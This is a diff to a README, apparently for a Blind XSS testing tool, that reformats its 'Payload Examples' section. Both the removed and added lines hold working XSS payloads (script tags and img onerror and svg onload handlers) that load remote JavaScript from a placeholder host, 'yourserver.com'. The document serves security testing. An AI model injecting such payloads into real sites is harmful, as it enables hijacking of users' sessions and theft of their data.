@@ -14,8 +14,9 @@ This project is designed to identify Blind XSS vulnerabilities by capturing data
 3. Push changes to GitHub.
 
 ## 🧪 Payload Examples
-<script src=//yourserver.com/script.js></script>
+```html
+<script src="//yourserver.com/script.js"></script>
 <script>$.getScript("https://yourserver.com/script.js")</script>
-<Img src="nonexistent.jpg" OnError="var script = document.createElement('script'); script.src = 'https://yourserver.com/script.js'; document.head.appendChild(script);">
-<Svg Only=1 OnLoad="var script = document.createElement('script'); script.src = 'https://yourserver.com/script.js'; document.head.appendChild(script);">
-
+<img src="nonexistent.jpg" onerror="var script = document.createElement('script'); script.src = 'https://yourserver.com/script.js'; document.head.appendChild(script);">
+<svg onload="var script = document.createElement('script'); script.src = 'https://yourserver.com/script.js'; document.head.appendChild(script);"></svg>
+```
